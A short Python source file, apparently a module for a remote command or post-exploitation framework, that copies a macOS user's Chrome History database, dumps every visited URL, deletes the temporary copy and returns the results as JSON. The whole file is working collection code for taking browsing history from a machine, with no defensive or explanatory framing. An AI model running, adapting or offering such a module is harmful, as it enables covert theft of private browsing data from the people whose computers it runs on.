import shutil
import sqlite3
import json
import os
from os.path import expanduser
from apps.server.modules.libs.mod_interface import mod_interface


class mod_chrome_history(mod_interface):
    def setup_mod(self):
        print(f'Module Setup (mod_chrome_history) called successfully!')

    def run_mod(self, cmd = ""):
        shutil.copy2(expanduser("~") + '/Library/Application Support/Google/Chrome/Default/History', 'chrome_hist')
        con = sqlite3.connect('chrome_hist')
        cur = con.cursor()
        cur.execute('SELECT * FROM urls')
        data = cur.fetchall()
        cur.close()
        con.close()
        os.remove('chrome_hist')
        return json.dumps(data)
